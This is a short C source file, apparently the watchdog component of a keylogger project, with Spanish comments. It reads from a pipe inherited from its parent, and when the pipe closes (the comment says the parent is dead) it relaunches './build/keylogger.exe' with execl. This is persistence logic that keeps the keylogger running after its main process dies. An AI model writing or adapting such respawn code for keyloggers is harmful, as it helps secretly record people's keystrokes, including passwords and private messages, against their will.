#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

main(int argc, char *argv[]) {
	printf("Ejecutando watchdog (%d)\n", getpid());

	int pipe = atoi(argv[1]);

	FILE *stream;

	stream = fdopen (pipe, "r");

	int c;
	while ((c = fgetc (stream)) != EOF) {
	}
	fclose (stream);

	// El padre está muerto
	char *programName = "./build/keylogger.exe";
	execl(programName, programName, NULL);
}